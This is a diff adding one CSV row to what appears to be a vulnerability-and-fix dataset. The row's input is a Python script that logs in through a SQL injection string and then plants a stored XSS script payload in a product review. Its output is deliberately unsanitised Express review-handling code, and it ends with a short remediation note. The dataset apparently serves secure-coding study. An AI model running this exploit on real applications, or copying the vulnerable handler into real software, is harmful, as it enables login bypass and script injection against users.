@@ -1,0 +1,33 @@
+"id","vuln_type","cwe","input","output","fix"
+"pair_004","Stored XSS","CWE-79","import requests
+
+TARGET = ""http://vulnerable-app:3000""
+
+# Step 1: Auth via SQLi
+login = requests.post(f""{TARGET}/rest/user/login"",
+    json={""email"": ""' OR 1=1--"", ""password"": ""x""}, timeout=10)
+token = login.json().get(""authentication"", {}).get(""token"")
+
+# Step 2: Inject stored XSS via product review
+headers = {""Authorization"": f""Bearer {token}""} if token else {}
+review = {""message"": '<script>alert(""Stored XSS"")</script>', ""author"": ""attacker@evil.com""}
+
+resp = requests.put(f""{TARGET}/rest/products/1/reviews"",
+    json=review, headers=headers, timeout=10)
+
+if resp.status_code in (200, 201):
+    print(""[+] Stored XSS payload injected into review"")
+    print(""[+] Any user viewing product #1 will execute the script"")
+","// Store review - no sanitization
+app.put('/rest/products/:id/reviews', async (req, res) => {
+    const { message, author } = req.body;
+    await Review.create({ product: req.params.id, message, author });
+    res.status(201).json({ status: 'success' });
+});
+
+// Render reviews - raw HTML output
+app.get('/rest/products/:id/reviews', async (req, res) => {
+    const reviews = await Review.find({ product: req.params.id });
+    let html = reviews.map(r => `<p>${r.author}: ${r.message}</p>`).join('');
+    res.send(html);
+});","Sanitize on input: DOMPurify.sanitize(message). Escape on output: use template engine with auto-escaping."
